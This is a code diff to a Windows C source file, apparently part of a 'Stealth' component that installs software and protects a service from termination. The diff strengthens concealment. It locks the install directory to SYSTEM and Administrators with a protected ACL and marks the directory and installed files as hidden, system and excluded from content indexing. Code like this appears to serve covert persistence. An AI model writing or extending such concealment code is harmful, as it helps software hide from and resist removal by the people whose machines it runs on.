@@ -13,6 +13,7 @@
 #include <winternl.h>
 #include <stdio.h>
 #include <netfw.h>
+#include <aclapi.h>
 #include <sddl.h>
 #include "stealth.h"
 
@@ -767,37 +768,47 @@ BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName)
 
 BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath)
 {
+    if (installPath == NULL || installPath[0] == L'\0') { return FALSE; }
+
+    PSECURITY_DESCRIPTOR pSD = NULL;
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;FA;;;SY)(A;FA;;;BA)", SDDL_REVISION_1, &pSD, NULL))
+    {
+        return FALSE;
+    }
+
     SECURITY_ATTRIBUTES sa = {0};
-    SECURITY_DESCRIPTOR sd = {0};
-
-    // Initialize security descriptor (SYSTEM full control only)
-    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
-    {
-        return FALSE;
-    }
-
-    // Set DACL to NULL for default system permissions
-    if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE))
-    {
-        return FALSE;
-    }
-
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.lpSecurityDescriptor = &sd;
+    sa.lpSecurityDescriptor = pSD;
     sa.bInheritHandle = FALSE;
 
-    // Create directory with system permissions
-    if (!CreateDirectoryW(installPath, &sa))
+    BOOL createOk = CreateDirectoryW(installPath, &sa);
+    DWORD createErr = createOk ? ERROR_SUCCESS : GetLastError();
+    LocalFree(pSD);
+    if (!createOk && createErr != ERROR_ALREADY_EXISTS)
     {
-        DWORD error = GetLastError();
-        if (error != ERROR_ALREADY_EXISTS)
-        {
-            return FALSE;
-        }
+        return FALSE;
     }
 
-    // Set directory as hidden and system
-    SetFileAttributesW(installPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    // Harden ACL even if directory existed
+    PSECURITY_DESCRIPTOR applySD = NULL;
+    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;FA;;;SY)(A;FA;;;BA)", SDDL_REVISION_1, &applySD, NULL))
+    {
+        PACL dacl = NULL;
+        BOOL daclPresent = FALSE, daclDefaulted = FALSE;
+        if (GetSecurityDescriptorDacl(applySD, &daclPresent, &dacl, &daclDefaulted) && daclPresent)
+        {
+            SetNamedSecurityInfoW((LPWSTR)installPath, SE_FILE_OBJECT,
+                                  DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
+                                  NULL, NULL, dacl, NULL);
+        }
+        LocalFree(applySD);
+    }
+
+    DWORD attrs = GetFileAttributesW(installPath);
+    if (attrs == INVALID_FILE_ATTRIBUTES) { attrs = 0; }
+    attrs &= ~FILE_ATTRIBUTE_ARCHIVE;
+    attrs |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED;
+    SetFileAttributesW(installPath, attrs);
 
     return TRUE;
 }
@@ -818,7 +829,7 @@ BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath)
     }
 
     // Set as hidden and system file
-    SetFileAttributesW(destPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    SetFileAttributesW(destPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
 
     return TRUE;
 }
